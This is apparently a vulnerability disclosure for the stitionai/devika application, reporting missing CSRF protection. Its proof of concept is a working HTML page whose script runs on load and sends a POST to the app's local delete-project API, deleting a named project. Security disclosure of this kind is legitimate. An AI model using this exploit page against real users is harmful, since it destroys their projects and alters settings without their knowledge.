Title: CSRF leads to project deletion and changing settings in stitionai/devika

Proof of Concept: 
The application does not implement any CSRF protection. Visiting website with content below results in performing successful CSRF attack and deletion of the TEST123 project.

<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/127.0.0.1:1337\/api\/delete-project", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application\/json");
        var body = "{\"project_name\":\"TEST123\"}";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
